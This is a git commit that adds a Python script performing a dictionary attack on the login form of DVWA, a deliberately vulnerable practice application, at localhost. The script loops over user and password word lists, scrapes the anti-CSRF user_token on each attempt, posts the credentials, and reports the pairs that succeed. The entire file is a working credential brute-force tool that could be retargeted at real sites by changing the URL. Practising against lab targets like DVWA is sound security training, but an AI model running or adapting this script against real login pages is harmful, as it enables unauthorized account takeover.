6c60108dcc092124279dc862f4e7961719ae27a9
tomvapon <tomasvarona91@gmail.com>
2022-05-16 21:41:42 +0200

    Login dictionary attack to DVWA

---
+++ dictionary_attack_login.py
@@ -0,0 +1,37 @@
+from bs4 import BeautifulSoup
+import requests
+import re
+
+# Target URL
+login_url = 'http://localhost/login.php'
+
+# Define generic payload payload
+payload = {
+    'username': '',
+    'password': '',
+    'Login': 'Login'
+}
+
+# Open a new session to hack
+with requests.Session() as session:
+    # Crack the login password with dictionary attack
+    with open('users.txt', 'r', encoding='utf-8') as users:
+        for user in users:
+            with open('passwords.txt', 'r', encoding='utf-8') as passwords:
+                for password in passwords:
+                    # Try payload to send in order to crack login
+                    payload['username'] = user.strip()
+                    payload['password'] = password.strip()
+                    # Get the login url
+                    r = session.get(login_url)
+    
+                    # Extract user token
+                    token = re.search("user_token'\s*value='(.*?)'", r.text).group(1)
+                    payload['user_token'] = token
+
+                    # Try to hack with payload
+                    p = session.post(login_url, data=payload)
+
+                    # If hack is done, it will redirect to index
+                    if p.url in ['http://localhost/index.php']:
+                        print(f'Cracked with {user.strip()}/{password.strip()}')
